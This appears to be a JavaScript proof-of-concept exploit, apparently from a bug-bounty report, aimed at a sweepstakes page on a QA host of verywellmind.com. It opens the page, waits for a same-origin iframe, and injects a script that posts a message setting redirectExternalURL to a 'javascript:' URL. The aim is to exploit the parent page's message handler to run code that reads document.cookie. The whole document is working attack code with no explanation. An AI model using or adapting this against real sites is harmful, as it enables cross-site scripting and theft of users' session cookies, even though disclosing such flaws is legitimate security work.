const targetWindow = window.open('https://www-health-mind-art-1044-health-qa.a-ue1.verywellmind.com/sweepstakes', '_blank');
let interval = setInterval(() => {
    if (targetWindow.closed) {
        clearInterval(interval);
        return;
    }
    const iframe = targetWindow.frames[1];

    if (iframe && iframe.location.origin === window.location.origin) {
        const script = iframe.document.createElement('script');
        script.textContent = `window.parent.postMessage({redirectExternalURL:'javascript:confirm(document.cookie)'},'*')`;
        iframe.document.body.appendChild(script);
        clearInterval(interval);
    }
}, 100);